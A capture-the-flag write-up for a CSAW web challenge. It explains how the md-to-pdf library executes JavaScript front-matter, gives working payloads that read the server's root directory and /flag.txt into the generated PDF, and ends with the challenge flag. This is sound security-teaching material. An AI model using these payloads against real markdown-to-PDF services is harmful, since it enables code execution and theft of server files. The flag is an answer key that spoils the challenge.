---
title: "My Little Website"
date: 2022-09-12T14:28:16-04:00
draft: false
authors: ["CDT Daniel Chung"] 
tags: ["csaw", "web"]
---

Let's say, hypothetically, that you made a program without user sanization...

## Description

I am new to programming and made this simple pdf creater website here, hopefully it is secure enough :)...

http://web.chal.csaw.io:5013/

### TL;DR

Server is powered by express and was using `md-to-pdf` for converting markdown to pdfs. A vulnerability exists for RCE within `md-to-pdf`, exploit and get flag.

### First Look

The first thing I did was fire off a Nikto scan, which shows that the server is powered by express. We now know that the backend is `nodejs`.

### Correct Path

Thankfully, no rabbit holes here. An extremely educated guess had me thinking that the server was using `md-to-pdf` to convert markdown into a pdf. [Googling](https://www.google.com/search?channel=fs&client=ubuntu&q=markdown+to+pdf+exploit) if there was an exploit managed to get me to find [this](https://github.com/simonhaenisch/md-to-pdf/issues/99) github issue, where `simonhaenisch` posted a possible exploit. 

```js
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```

When testing this, I could see all the files in the application directory being output into the pdf. Changing the `readdirSync` to `readFileSync` as defined [here](https://www.geeksforgeeks.org/node-js-fs-readfilesync-method/) allows the pdf to show the flag encoded in decimal, and using a decimal to ascii converter we get the flag.

### Solve

```js
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt').join()}"; display: block }`,
}
---
```

### Flag

```
CTF{pdf_c0nt1nu3s_70_5uCK} 
```